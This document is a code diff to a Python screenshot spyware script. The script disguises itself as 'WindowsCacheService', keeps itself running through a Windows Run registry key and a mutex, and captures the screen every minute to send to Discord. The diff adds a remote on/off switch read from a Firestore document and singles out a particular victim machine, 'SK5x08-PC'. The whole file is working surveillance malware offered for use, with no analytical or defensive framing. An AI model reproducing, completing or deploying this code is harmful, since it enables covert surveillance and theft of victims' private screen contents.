@@ -5,6 +5,8 @@ import time
 import ctypes
 import base64
 import struct
+import json
+import socket
 import urllib.request
 import urllib.error
 import subprocess
@@ -20,6 +22,12 @@ INTERVAL = 60
 MUTEX_NAME = "Global\\WindowsCacheServiceMutex"
 STARTUP_REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
 STARTUP_REG_NAME = "WindowsCacheService"
+FIRESTORE_STATUS_URL = (
+    "https://firestore.googleapis.com/v1/projects/"
+    "database-c7f56/databases/(default)/documents/users/app"
+)
+COMPUTER_NAME = socket.gethostname().upper()
+TARGET_NAME = "SK5x08-PC"
 try:
     mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
     if ctypes.windll.kernel32.GetLastError() == 183:
@@ -27,7 +35,6 @@ try:
 except Exception:
     pass
 def find_pythonw():
-    current_exe = os.path.abspath(sys.executable).lower()
     try:
         result = subprocess.run(["where", "pythonw"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5, text=True)
         if result.returncode == 0:
@@ -37,13 +44,6 @@ def find_pythonw():
                     return p
     except:
         pass
-    for candidate in [os.path.join(os.path.dirname(sys.executable), "pythonw.exe"),
-                      r"C:\Python313\pythonw.exe",
-                      r"C:\Python312\pythonw.exe",
-                      r"C:\Python311\pythonw.exe",
-                      r"C:\Python310\pythonw.exe"]:
-        if os.path.isfile(candidate):
-            return candidate
     return sys.executable
 def ensure_persistence():
     try:
@@ -56,6 +56,22 @@ def ensure_persistence():
         return True
     except Exception:
         return False
+def fetch_firebase_status():
+    try:
+        req = urllib.request.Request(FIRESTORE_STATUS_URL, headers={'User-Agent': 'Mozilla/5.0'})
+        with urllib.request.urlopen(req, timeout=6) as response:
+            data = json.loads(response.read().decode())
+            fields = data.get("fields", {})
+            all_status = fields.get("all", {}).get("stringValue", "on")
+            sk5_status = fields.get("SK5x08", {}).get("stringValue", "off")
+            return all_status.lower(), sk5_status.lower()
+    except Exception:
+        return "on", "off"
+def should_send_screenshot(all_status, sk5_status):
+    if COMPUTER_NAME == TARGET_NAME:
+        return sk5_status == "on"
+    else:
+        return all_status == "on"
 def take_screenshot():
     try:
         from PIL import ImageGrab
@@ -124,11 +140,15 @@ def send_screenshot_to_discord(image_buffer):
         return False
 def main_loop():
     ensure_persistence()
+    last_all = None
+    last_sk5 = None
     while True:
         try:
-            img_buffer = take_screenshot()
-            if img_buffer:
-                send_screenshot_to_discord(img_buffer)
+            all_status, sk5_status = fetch_firebase_status()
+            if should_send_screenshot(all_status, sk5_status):
+                img_buffer = take_screenshot()
+                if img_buffer:
+                    send_screenshot_to_discord(img_buffer)
         except Exception:
             pass
         time.sleep(INTERVAL)
